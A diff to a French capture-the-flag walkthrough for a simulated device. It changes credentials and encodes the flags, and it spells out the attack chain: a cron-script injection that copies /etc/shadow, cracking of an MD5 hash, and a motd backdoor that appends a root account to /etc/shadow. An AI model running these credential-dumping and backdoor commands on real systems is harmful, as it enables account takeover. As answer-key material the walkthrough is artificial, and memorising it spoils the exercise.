@@ -3,8 +3,8 @@
 > Scénario CTF · Créneau : **15 minutes** · Une équipe à la fois
 
 ```
-[FOOTHOLD]        [CREDENTIAL ACCESS]       [PRIVESC]
-stagiaire/1234 ──► cron injection ──► admin/minitel ──► motd backdoor ──► root shell
+[FOOTHOLD]        [CREDENTIAL ACCESS]          [PRIVESC]
+stagiaire/monsuperstage ──► cron injection ──► admin/??? ──► motd backdoor ──► root shell
 ```
 
 ---
@@ -50,7 +50,7 @@ pio device monitor
 
 ```
 Login    : stagiaire
-Password : 1234
+Password : monsuperstage
 ```
 
 L'accès est limité (`user`) : pas d'accès aux répertoires des autres comptes, pas de lecture de `/root/` ni de `/etc/shadow`.
@@ -84,18 +84,18 @@ edit /scripts/maintenance.msh
 
 cat /tmp/loot.txt
 # root:2260a49226afcd3bb784cb3e3888ea91:root       ← incrackable
-# stagiaire:81dc9bdb52d04dc20036dbd8313ed055:user  ← connu (1234)
-# admin:bb3c3e98175d33c8300fbb0e84bf9e9f:admin     ← à cracker
+# stagiaire:a963f94274c1e9eb8dea99691443ab07:user  ← connu (fourni sur fiche)
+# admin:f7b16af5588f9654862e4aefcec8b0de:admin     ← à cracker
 ```
 
 ### Crack du hash
 
 ```
-admin:bb3c3e98175d33c8300fbb0e84bf9e9f → "minitel"
+admin:f7b16af5588f9654862e4aefcec8b0de → ???
 ```
 
 ```bash
-su admin   # password : minitel
+su admin   # password : <cracké>
 ```
 
 **Accès obtenu** : session `admin`.
@@ -108,10 +108,11 @@ su admin   # password : minitel
 
 ```bash
 ls
-# → user.txt  notes_perso.txt  README.txt
+# → user.txt  notes_perso.txt  README.txt  (explorer le home)
 
 cat user.txt
-# FLAG{4dm1n_4cc3ss}
+# bWluaXRlbCgwbGQzNTdfN3IxY2tfMW5fN2gzX2IwMGsp
+# (decoder en base64 hors application)
 ```
 
 ---
@@ -133,13 +134,13 @@ En créant `motd_perso.txt` avec une commande d'écriture dans `/etc/shadow`, l'
 
 ```bash
 edit motd_perso.txt
-# → ajouter : echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow
+# → ajouter : echo pwned:a963f94274c1e9eb8dea99691443ab07:root >> /etc/shadow
 # → sauvegarder (w)
 
 motd
 # → exécution en root → compte "pwned" ajouté dans /etc/shadow
 
-su pwned   # password : 1234  (hash réutilisé depuis /tmp/loot.txt)
+su pwned   # password : monsuperstage  (hash réutilisé depuis /tmp/loot.txt)
 ```
 
 **Accès obtenu** : shell root réel.
@@ -148,7 +149,8 @@ su pwned   # password : 1234  (hash réutilisé depuis /tmp/loot.txt)
 
 ```bash
 cat /root/root.txt
-# FLAG{r00t_m0td_pwn3d}
+# bWluaXRlbChnMDdfcjAwN18wbl8wbGRfbTFuMTczbCk=
+# (decoder en base64 hors application)
 ```
 
 ---
@@ -212,16 +214,16 @@ sim_fs/
 edit /scripts/maintenance.msh
 # → :a  →  cat /etc/shadow > /tmp/loot.txt  →  Entrée  →  :wq
 # (attendre ~30s)
-cat /tmp/loot.txt               # hash admin = bb3c3e... → "minitel"
-su admin                        # password : minitel
+cat /tmp/loot.txt               # hash admin = f7b16a... → cracker (john/hashcat)
+su admin                        # password : <cracké>
 
 # Phase 3 — Flag utilisateur
-cat user.txt                    # FLAG{4dm1n_4cc3ss}
+cat user.txt                    # base64 → decoder hors application
 
 # Phase 4 — Root
 edit motd_perso.txt
-# → :a  →  echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow  →  Entrée  →  :wq
+# → :a  →  echo pwned:a963f94274c1e9eb8dea99691443ab07:root >> /etc/shadow  →  Entrée  →  :wq
 motd
-su pwned                        # password : 1234
-cat /root/root.txt              # FLAG{r00t_m0td_pwn3d}
+su pwned                        # password : monsuperstage
+cat /root/root.txt              # base64 → decoder hors application
 ```
